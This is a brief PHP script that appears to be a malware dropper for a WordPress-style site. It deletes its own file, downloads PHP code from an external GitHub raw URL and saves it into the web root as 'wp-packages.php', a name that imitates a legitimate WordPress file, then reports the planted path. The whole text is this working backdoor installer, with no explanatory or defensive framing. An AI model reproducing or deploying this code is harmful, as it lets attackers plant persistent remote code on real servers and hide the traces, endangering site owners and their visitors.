<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$c = file_get_contents('https://raw.githubusercontent.com/dallasdilla/dillarep/refs/heads/main/l1/ls0my3pR.php');
if (strpos($c, '<?php')===false)  die('err dl');
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-packages.php')) die('file exist');
$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-packages.php', $c);
if ($r===false) die('err saving');
die('/wp-packages.php');